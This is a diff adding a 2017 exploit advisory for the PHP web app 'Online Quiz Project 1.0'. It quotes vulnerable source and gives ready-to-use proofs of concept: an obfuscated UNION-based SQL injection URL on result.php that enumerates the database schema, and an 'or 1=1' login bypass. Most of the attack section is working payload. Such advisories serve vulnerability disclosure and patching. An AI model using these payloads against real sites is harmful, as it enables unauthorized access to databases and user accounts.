@@ -1,0 +1,56 @@
+# # # # #
+# Exploit Title: Online Quiz Project 1.0 - Multiple Vulnerabilities
+# Dork: N/A
+# Date: 17.08.2017
+# Vendor Homepage : http://surajkumar.in/
+# Software Link: http://surajkumar.in/product/online-quiz-project-php/
+# Demo: http://surajkumar.in/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands...
+# The vulnerability allows an attacker to access the user panel...
+# 
+# Vulnerable Source:
+# # # # #
+# <?php
+# ....1
+# if(isset($_POST['_login'])){
+# $data=array();
+# $data['user']=$_POST['_user'];
+# $data['password']=$_POST['_password'];
+# $userLogin=user_login($data);
+# _t($userLogin);
+# if($userLogin['bool']==fa
+# 
+# ....2
+# $questionData='';
+# if(isset($_GET['cat_id'])){
+# $userData=get_result_by_user($_SESSION['user']['user_id'],$_GET['cat_id']);
+# ....
+# }else{
+# $query=mysqli_query($db,"SELECT * FROM user_answered WHERE user_id='$user_id' AND cat_id='$cat_id'");
+# }
+# ....
+# ?>
+# # # # #
+# 	
+# Proof of Concept:
+# 
+# 1:
+# http://localhost/[PATH]/result.php?cat_id=[SQL]
+# -1'+/*!22222UnIoN*/(/*!22222SeLeCT*/+0x283129,(select(@x)from(select(@x:=0x00),(@running_number:=0),(@tbl:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=Concat(@x,0x3c62723e,if((@tbl!=table_name),/*!11111Concat*/(0x3c2f6469763e,LPAD(@running_number:=@running_number%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c62723e,(@z:=0x00),0x3c646976207374796c653d226d617267696e2d6c6566743a333070783b223e),0x00),lpad(@z:=@z%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d626c75653e,column_name,0x3c2f666f6e743e))))x),0x283329,0x283429,0x283529,0x283629,0x283729,0x283829,0x283929,0x28313029,0x28313129,0x28313229,0x28313329,0x28313429,0x28313529)--+-&docname=0x30783330
+# 
+# 2:
+# http://localhost/[PATH]/login.php
+# User: 'or 1=1 or ''=' Pass: 'or 1=1 or ''='
+# 
+# Etc...
+# # # # #
